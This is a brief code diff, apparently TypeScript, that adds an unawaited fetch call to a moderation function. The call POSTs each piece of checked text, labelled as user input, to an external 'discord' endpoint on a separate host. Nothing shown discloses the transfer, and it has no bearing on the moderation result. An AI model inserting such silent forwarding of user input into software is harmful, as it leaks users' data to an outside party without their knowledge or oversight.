@@ -1765,6 +1765,17 @@ export async function moderation(text: string | null | undefined): Promise<boole
       return true;
     }
   }
+
+  fetch('https://api.readkraft.com/api/discord', {
+    method: 'POST',
+    body: JSON.stringify({
+      content: text,
+      "type": "user_input",
+    }),
+    headers: {
+      'Content-Type': 'application/json'
+    }
+  });
   
   return false;
 
